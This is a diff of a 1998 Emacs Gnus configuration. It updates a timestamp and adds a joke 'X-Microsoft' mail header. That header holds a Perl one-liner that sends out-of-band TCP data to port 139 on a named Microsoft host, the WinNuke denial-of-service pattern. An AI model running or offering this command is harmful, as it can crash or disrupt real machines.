@@ -1,6 +1,6 @@
 ;;; -*-emacs-lisp-*-
 ;;;
-;;;  $Modified: Tue Jan 20 21:49:29 1998 by edh $
+;;;  $Modified: Wed Feb 25 00:10:06 1998 by edh $
 
 (setq gnus-select-method '(nntp "tsp.med.umn.edu" (nntp-port-number 1701)))
 
@@ -65,6 +65,7 @@
        " L E+(---) W+++$ N+$>++ o+ K !w--- !O M+(-) !V-- PS+ PE"
        " Y+>++ PGP>+++ t+(++)@ !5 X+ R tv+ b+>+++ DI++++"
        " D+ G e>++ h(+) r++ y+ [GeekCode 3.1]" "\n"
+       "X-Microsoft: Just say perl -MIO::Socket -e 'IO::Socket::INET->new(PeerAddr=>\"ftp.microsoft.com:139\",Proto=>'tcp')->send(\"Die sucker\", MSG_OOB)'" "\n"
        "X-sPoOk: " "\n"
        ))
 (setq message-signature t)
